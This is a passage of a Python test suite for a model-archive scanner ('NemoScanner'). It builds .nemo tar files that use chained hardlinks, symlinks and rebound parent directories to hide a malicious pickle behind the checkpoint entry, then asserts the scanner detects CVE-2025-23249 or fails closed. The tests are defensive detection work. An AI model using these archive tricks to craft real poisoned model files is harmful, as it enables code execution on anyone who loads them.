        nemo_path = tmp_path / "checkpoint-later-symlink-alias-write.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "model_weights.ckpt"
            tar.addfile(alias_link)
            _add_tar_bytes(tar, "alias.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_detects_write_through_symlinked_parent(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-symlinked-parent-write.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="targetdir/model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            writer_link = tarfile.TarInfo(name="targetdir/writer.bin")
            writer_link.type = tarfile.LNKTYPE
            writer_link.linkname = "payload.bin"
            tar.addfile(writer_link)
            parent_alias = tarfile.TarInfo(name="alias")
            parent_alias.type = tarfile.SYMTYPE
            parent_alias.linkname = "targetdir"
            tar.addfile(parent_alias)
            _add_tar_bytes(tar, "alias/writer.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249"
            and check.details.get("entry") == "targetdir/model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_target_written_through_symlinked_parent_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-target-symlinked-parent.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            parent_alias = tarfile.TarInfo(name="dir")
            parent_alias.type = tarfile.SYMTYPE
            parent_alias.linkname = "actual"
            tar.addfile(parent_alias)
            _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "dir/payload.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_detects_writer_symlink_installed_through_parent_alias(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-writer-symlinked-parent.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            parent_alias = tarfile.TarInfo(name="dir")
            parent_alias.type = tarfile.SYMTYPE
            parent_alias.linkname = "actual"
            tar.addfile(parent_alias)
            writer_alias = tarfile.TarInfo(name="dir/writer.bin")
            writer_alias.type = tarfile.SYMTYPE
            writer_alias.linkname = "../model_weights.ckpt"
            tar.addfile(writer_alias)
            _add_tar_bytes(tar, "actual/writer.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_fresh_hardlink_symlink_fallback_mutation_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-fresh-hardlink-symlink-fallback-malicious.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            source_alias = tarfile.TarInfo(name="source_alias")
            source_alias.type = tarfile.SYMTYPE
            source_alias.linkname = "."
            tar.addfile(source_alias)
            parent_alias = tarfile.TarInfo(name="alias")
            parent_alias.type = tarfile.LNKTYPE
            parent_alias.linkname = "source_alias"
            tar.addfile(parent_alias)
            _add_tar_bytes(tar, "alias/payload.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_fresh_hardlink_symlink_fallback_safe_replacement_fails_closed(
        self, tmp_path: Path
    ) -> None:
        nemo_path = tmp_path / "checkpoint-fresh-hardlink-symlink-fallback-safe.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            source_alias = tarfile.TarInfo(name="source_alias")
            source_alias.type = tarfile.SYMTYPE
            source_alias.linkname = "."
            tar.addfile(source_alias)
            parent_alias = tarfile.TarInfo(name="alias")
            parent_alias.type = tarfile.LNKTYPE
            parent_alias.linkname = "source_alias"
            tar.addfile(parent_alias)
            _add_tar_bytes(tar, "alias/payload.bin", b"safe weights")

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_ignores_unrelated_post_source_fallback_alias(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-unrelated-post-source-fallback-alias.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "asset.txt", b"safe")
            latest_alias = tarfile.TarInfo(name="latest")
            latest_alias.type = tarfile.SYMTYPE
            latest_alias.linkname = "asset.txt"
            tar.addfile(latest_alias)
            copied_alias = tarfile.TarInfo(name="copy")
            copied_alias.type = tarfile.LNKTYPE
            copied_alias.linkname = "latest"
            tar.addfile(copied_alias)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_fresh_symlink_fallback_before_source_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-fresh-symlink-fallback-before-source.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            source_alias = tarfile.TarInfo(name="source_alias")
            source_alias.type = tarfile.SYMTYPE
            source_alias.linkname = "."
            tar.addfile(source_alias)
            parent_alias = tarfile.TarInfo(name="alias")
            parent_alias.type = tarfile.LNKTYPE
            parent_alias.linkname = "source_alias"
            tar.addfile(parent_alias)
            _add_tar_bytes(tar, "alias/payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias/payload.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_ignores_unrelated_pre_source_fallback_alias(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-unrelated-pre-source-fallback-alias.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "asset.txt", b"safe")
            latest_alias = tarfile.TarInfo(name="latest")
            latest_alias.type = tarfile.SYMTYPE
            latest_alias.linkname = "asset.txt"
            tar.addfile(latest_alias)
            copied_alias = tarfile.TarInfo(name="copy")
            copied_alias.type = tarfile.LNKTYPE
            copied_alias.linkname = "latest"
            tar.addfile(copied_alias)
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_parent_symlink_installed_by_fallback_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-parent-symlink-hardlink-fallback-malicious.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            old_alias = tarfile.TarInfo(name="alias")
            old_alias.type = tarfile.SYMTYPE
            old_alias.linkname = "old"
            tar.addfile(old_alias)
            new_alias = tarfile.TarInfo(name="new_alias")
            new_alias.type = tarfile.SYMTYPE
            new_alias.linkname = "new"
            tar.addfile(new_alias)
            replacement = tarfile.TarInfo(name="alias")
            replacement.type = tarfile.LNKTYPE
            replacement.linkname = "new_alias"
            replacement.mode = 0o755
            tar.addfile(replacement)
            _add_tar_bytes(tar, "alias/payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias/payload.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_ignores_payload_replaced_after_fallback_parent_symlink(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-parent-symlink-hardlink-fallback-safe.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            old_alias = tarfile.TarInfo(name="alias")
            old_alias.type = tarfile.SYMTYPE
            old_alias.linkname = "old"
            tar.addfile(old_alias)
            new_alias = tarfile.TarInfo(name="new_alias")
            new_alias.type = tarfile.SYMTYPE
            new_alias.linkname = "new"
            tar.addfile(new_alias)
            replacement = tarfile.TarInfo(name="alias")
            replacement.type = tarfile.LNKTYPE
            replacement.linkname = "new_alias"
            replacement.mode = 0o755
            tar.addfile(replacement)
            _add_tar_bytes(tar, "alias/payload.bin", _build_malicious_pickle())
            _add_tar_bytes(tar, "new/payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias/payload.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_source_rebound_before_load_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-source-rebound-before-load.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            old_dir = tarfile.TarInfo(name="dir")
            old_dir.type = tarfile.SYMTYPE
            old_dir.linkname = "old"
            tar.addfile(old_dir)
            _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
            new_dir = tarfile.TarInfo(name="dir")
            new_dir.type = tarfile.SYMTYPE
            new_dir.linkname = "new"
            tar.addfile(new_dir)
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "dir/payload.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "new/payload.bin", b"safe weights")

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_alias_detects_colliding_hardlink_fallback_write(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-hardlink-collision-write.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.bin"
            tar.addfile(alias_link)
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "evil.bin", _build_malicious_pickle())
            colliding_link = tarfile.TarInfo(name="alias.bin")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "evil.bin"
            tar.addfile(colliding_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_detects_nested_hardlink_fallback_write(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-nested-hardlink-collision-write.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.bin"
            tar.addfile(alias_link)
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "evil.bin", _build_malicious_pickle())
            evil_alias = tarfile.TarInfo(name="evil_alias.bin")
            evil_alias.type = tarfile.LNKTYPE
            evil_alias.linkname = "evil.bin"
            tar.addfile(evil_alias)
            colliding_link = tarfile.TarInfo(name="alias.bin")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "evil_alias.bin"
            tar.addfile(colliding_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_preserves_content_when_collision_falls_back_to_symlink(
        self, tmp_path: Path
    ) -> None:
        nemo_path = tmp_path / "checkpoint-hardlink-collision-symlink-fallback.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.bin"
            tar.addfile(alias_link)
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias.bin"
            tar.addfile(checkpoint_link)
            safe_link = tarfile.TarInfo(name="safe_alias.bin")
            safe_link.type = tarfile.SYMTYPE
            safe_link.linkname = "safe.bin"
            tar.addfile(safe_link)
            colliding_link = tarfile.TarInfo(name="alias.bin")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "safe_alias.bin"
            tar.addfile(colliding_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_with_fallback_symlink_back_to_inode_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-hardlink-symlink-back-to-inode.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            same_inode_link = tarfile.TarInfo(name="same.bin")
            same_inode_link.type = tarfile.SYMTYPE
            same_inode_link.linkname = "payload.bin"
            tar.addfile(same_inode_link)
            colliding_link = tarfile.TarInfo(name="model_weights.ckpt")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "same.bin"
            tar.addfile(colliding_link)

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_duplicate_checkpoint_symlink_uses_final_malicious_target(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-duplicate-symlink-final-target.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "safe.bin", b"safe weights")
            first_link = tarfile.TarInfo(name="model_weights.ckpt")
            first_link.type = tarfile.SYMTYPE
            first_link.linkname = "safe.bin"
            tar.addfile(first_link)
            _add_tar_bytes(tar, "evil.bin", _build_malicious_pickle())
            final_link = tarfile.TarInfo(name="model_weights.ckpt")
            final_link.type = tarfile.SYMTYPE
            final_link.linkname = "evil.bin"
            tar.addfile(final_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_final_colliding_checkpoint_hardlink_uses_malicious_target(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-final-colliding-hardlink.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "safe.bin", b"safe weights")
            first_link = tarfile.TarInfo(name="model_weights.ckpt")
            first_link.type = tarfile.LNKTYPE
            first_link.linkname = "safe.bin"
            tar.addfile(first_link)
            _add_tar_bytes(tar, "evil.bin", _build_malicious_pickle())
            final_link = tarfile.TarInfo(name="model_weights.ckpt")
            final_link.type = tarfile.LNKTYPE
            final_link.linkname = "evil.bin"
            tar.addfile(final_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_outer_symlink_checkpoint_detects_colliding_hardlink_mutation(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-outer-symlink-hardlink-mutation.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.bin"
            tar.addfile(alias_link)
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.SYMTYPE
            checkpoint_link.linkname = "alias.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "evil.bin", _build_malicious_pickle())
            evil_link = tarfile.TarInfo(name="evil_link.bin")
            evil_link.type = tarfile.SYMTYPE
            evil_link.linkname = "evil.bin"
            tar.addfile(evil_link)
            colliding_link = tarfile.TarInfo(name="alias.bin")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "evil_link.bin"
            tar.addfile(colliding_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_outer_symlink_checkpoint_follows_rebound_parent_symlink(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-outer-symlink-rebound-parent-malicious.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "new/payload.bin", _build_malicious_pickle())
            old_dir = tarfile.TarInfo(name="dir")
            old_dir.type = tarfile.SYMTYPE
            old_dir.linkname = "old"
            tar.addfile(old_dir)
            _add_tar_bytes(tar, "dir/payload.bin", b"safe weights")
            new_dir = tarfile.TarInfo(name="dir")
            new_dir.type = tarfile.SYMTYPE
            new_dir.linkname = "new"
            tar.addfile(new_dir)
            checkpoint_link = tarfile.TarInfo(name="dir/model_weights.ckpt")
            checkpoint_link.type = tarfile.SYMTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249"
            and check.details.get("entry") == "dir/model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_outer_symlink_checkpoint_ignores_payload_hidden_by_rebound_parent_symlink(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-outer-symlink-rebound-parent-safe.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "new/payload.bin", b"safe weights")
            old_dir = tarfile.TarInfo(name="dir")
            old_dir.type = tarfile.SYMTYPE
            old_dir.linkname = "old"
            tar.addfile(old_dir)
            _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
            new_dir = tarfile.TarInfo(name="dir")
            new_dir.type = tarfile.SYMTYPE
            new_dir.linkname = "new"
            tar.addfile(new_dir)
            checkpoint_link = tarfile.TarInfo(name="dir/model_weights.ckpt")
            checkpoint_link.type = tarfile.SYMTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_outer_symlink_checkpoint_follows_safe_root_alias_parent(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-outer-symlink-root-alias-parent.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            parent_alias = tarfile.TarInfo(name="dir")
            parent_alias.type = tarfile.SYMTYPE
            parent_alias.linkname = "."
            tar.addfile(parent_alias)
            _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="dir/model_weights.ckpt")
            checkpoint_link.type = tarfile.SYMTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249"
            and check.details.get("entry") == "dir/model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_checkpoint_hardlink_to_symlink_source_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-hardlink-to-symlink-source.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "payload.bin"
            tar.addfile(alias_link)
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_checkpoint_regular_write_after_link_history_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-regular-after-link-history.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.SYMTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "model_weights.ckpt", b"safe weights")
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_checkpoint_fallback_symlink_then_binary_write_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-fallback-installed-symlink.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            target_link = tarfile.TarInfo(name="target_link.bin")
            target_link.type = tarfile.SYMTYPE
            target_link.linkname = "model_weights.ckpt"
            tar.addfile(target_link)
            _add_tar_bytes(tar, "writer.bin", b"safe weights")
            colliding_link = tarfile.TarInfo(name="writer.bin")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "target_link.bin"
            tar.addfile(colliding_link)
            _add_tar_bytes(tar, "writer.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_checkpoint_dangling_symlink_hardlink_fallback_then_write_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-dangling-symlink-hardlink-fallback.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            target_link = tarfile.TarInfo(name="target_link.bin")
            target_link.type = tarfile.SYMTYPE
            target_link.linkname = "model_weights.ckpt"
            tar.addfile(target_link)
            writer_link = tarfile.TarInfo(name="writer.bin")
            writer_link.type = tarfile.LNKTYPE
            writer_link.linkname = "target_link.bin"
            tar.addfile(writer_link)
            _add_tar_bytes(tar, "writer.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_checkpoint_ancestor_symlink_rebinding_before_loaded_hardlink_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-ancestor-symlink-rebinding.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            old_dir = tarfile.TarInfo(name="dir")
            old_dir.type = tarfile.SYMTYPE
            old_dir.linkname = "old"
            tar.addfile(old_dir)
            _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
            alias_link = tarfile.TarInfo(name="dir/alias.bin")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "payload.bin"
            tar.addfile(alias_link)
            _add_tar_bytes(tar, "dir/model_weights.ckpt", b"safe weights")
            new_dir = tarfile.TarInfo(name="dir")
            new_dir.type = tarfile.SYMTYPE
            new_dir.linkname = "new"
            tar.addfile(new_dir)
            _add_tar_bytes(tar, "new/payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="dir/model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "dir/alias.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

